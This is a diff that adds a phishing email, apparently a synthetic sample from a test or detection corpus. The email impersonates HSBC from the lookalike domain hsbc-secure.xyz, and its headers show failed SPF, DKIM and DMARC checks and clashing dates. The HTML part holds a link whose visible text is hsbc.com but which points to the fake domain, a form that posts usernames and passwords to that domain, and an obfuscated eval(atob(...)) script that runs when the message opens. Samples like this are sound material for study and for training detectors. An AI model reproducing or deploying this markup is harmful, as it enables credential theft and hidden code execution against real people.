@@ -1,0 +1,31 @@
+From: notice@hsbc-secure.xyz
+To: victim20@example.com
+Subject: Your account has been suspended - immediate action required
+Date: Tue, 03 Mar 2002 13:50:00 -0500
+Message-ID: <phish-200-49b4e79c-8f6c-48b1-a75a-36aa558eaf90@hsbc-secure.xyz>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 08 Mar 2002 13:06:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 03 Mar 2002 00:25:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 04 Mar 2002 02:13:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 24 Mar 2002 05:25:00 -0500
+Return-Path: <bounce@mail-c94d1c83.top>
+Reply-To: recovery0@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-c94d1c83.top; dkim=fail header.d=hsbc-secure.xyz; dmarc=fail header.from=hsbc-secure.xyz
+Received-SPF: fail (mx.example.com: domain of notice@hsbc-secure.xyz does not designate 192.0.2.44 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=hsbc-secure.xyz; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-200-e2ca1812"
+
+--bnd-p-200-e2ca1812
+Content-Type: text/plain; charset="UTF-8"
+
+Dear customer,
+
+We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.
+http://hsbc-secure.xyz/login
+
+Reference: P571248
+--bnd-p-200-e2ca1812
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Dear customer,<br/><br/>We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.<br/>http://hsbc-secure.xyz/login<br/><br/>Reference: P571248</p><p><a href="http://hsbc-secure.xyz/login">https://www.hsbc.com/signin</a></p><form action="http://hsbc-secure.xyz/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-200-e2ca1812--
